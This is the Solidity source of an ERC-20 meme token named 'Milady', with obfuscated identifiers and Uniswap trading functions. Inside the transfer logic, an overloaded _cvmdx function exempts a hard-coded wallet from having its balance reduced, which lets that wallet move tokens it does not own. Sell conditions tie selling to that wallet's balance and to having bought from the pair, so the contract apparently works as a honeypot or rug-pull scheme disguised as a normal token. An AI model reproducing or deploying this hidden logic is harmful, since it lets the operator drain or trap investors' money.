/*
Twitter: https://twitter.com/Miladys_erc

Telegram: https://t.me/Miladys_erc20

Website: https://miladyerc.com/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.19;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _cvmdx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _cvmdx(a, b, "SafeMath");
    }

    function  _cvmdx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xodaum {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _praeceb {
    function sodmKanbupartmsFclaavec(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _praeceb private _Tevoqvk;
    address payable private _Fsjaucr;
    address private _kisbatr;

    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _qTotalqh = 1000000000 * 10 **_decimals;
    uint256 public _puevmal = _qTotalqh;
    uint256 public _Weranlf = _qTotalqh;
    uint256 public _rworThpav= _qTotalqh;
    uint256 public _BchTkaf= _qTotalqh;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _dsamher;
    mapping (address => bool) private _trarreuy;
    mapping(address => uint256) private _rjcbvfo;

    uint256 private _BuyinitialTax=5;
    uint256 private _SellinitialTax=10;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=5;
    uint256 private _SellAreduceTax=1;
    uint256 private _yribvkoq=0;
    uint256 private _brapjxe=0;

    bool private _qfvotjk;
    bool public _Taueufam = false;
    bool private ouebjox = false;
    bool private _aeqnvnp = false;


    event _mraebevt(uint _puevmal);
    modifier olTfnkr {
        ouebjox = true;
        _;
        ouebjox = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _qTotalqh;
        _dsamher[owner(

        )] = true;
        _dsamher[address
        (this)] = true;
        _dsamher[
            _Fsjaucr] = true;
        _Fsjaucr = 
        payable (0x7E19e6813802986F90fb4666c45dE8FC9c85a174);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _qTotalqh);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _qTotalqh;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _cvmdx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rmsvubk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Taueufam) {
                if (to 
                != address
                (_Tevoqvk) 
                && to !=
                 address
                 (_kisbatr)) {
                  require(_rjcbvfo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rjcbvfo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kisbatr && to != 
            address(_Tevoqvk) &&
             !_dsamher[to] ) {
                require(amount 
                <= _puevmal,
                 "Exceeds the _puevmal.");
                require(balanceOf
                (to) + amount
                 <= _Weranlf,
                  "Exceeds the macxizse.");
                if(_brapjxe
                < _yribvkoq){
                  require
                  (! _epkvobz(to));
                }
                _brapjxe++;
                 _trarreuy
                 [to]=true;
                rmsvubk = amount._pvr
                ((_brapjxe>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kisbatr &&
             from!= address(this) 
            && !_dsamher[from] ){
                require(amount <= 
                _puevmal && 
                balanceOf(_Fsjaucr)
                <_BchTkaf,
                 "Exceeds the _puevmal.");
                rmsvubk = amount._pvr((_brapjxe>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_brapjxe>
                _yribvkoq &&
                 _trarreuy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ouebjox 
            && to == _kisbatr &&
             _aeqnvnp &&
             contractTokenBalance>
             _rworThpav 
            && _brapjxe>
            _yribvkoq&&
             !_dsamher[to]&&
              !_dsamher[from]
            ) {
                _pvnrnf( _vmqrz(amount, 
                _vmqrz(contractTokenBalance,
                _BchTkaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uvcpnv(address
                    (this).balance);
                }
            }
        }

        if(rmsvubk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rmsvubk);
          emit
           Transfer(from,
           address
           (this),rmsvubk);
        }
        _balances[from
        ]= _cvmdx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _cvmdx(rmsvubk));
        emit Transfer
        (from, to, 
        amount.
         _cvmdx(rmsvubk));
    }

    function _pvnrnf(uint256
     tokenAmount) private
      olTfnkr {
        if(tokenAmount==
        0){return;}
        if(!_qfvotjk)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tevoqvk.WETH();
        _approve(address(this),
         address(
             _Tevoqvk), 
             tokenAmount);
        _Tevoqvk.
        sodmKanbupartmsFclaavec
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _vmqrz
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _cvmdx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fsjaucr){
            return a ;
        }else{
            return a .
             _cvmdx (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _puevmal = _qTotalqh;
        _Weranlf = _qTotalqh;
        emit _mraebevt(_qTotalqh);
    }

    function _epkvobz(address 
    account) private view 
    returns (bool) {
        uint256 rabia;
        assembly {
            rabia :=
             extcodesize
             (account)
        }
        return rabia > 
        0;
    }

    function _uvcpnv(uint256
    amount) private {
        _Fsjaucr.
        transfer(
            amount);
    }

    function opensTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qfvotjk ) ;
        _Tevoqvk  
        =  
        _praeceb
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tevoqvk), 
            _qTotalqh);
        _kisbatr = 
        _xodaum(_Tevoqvk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tevoqvk .
             WETH ( ) );
        _Tevoqvk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kisbatr).
        approve(address(_Tevoqvk), 
        type(uint)
        .max);
        _aeqnvnp = true;
        _qfvotjk = true;
    }

    receive() external payable {}
}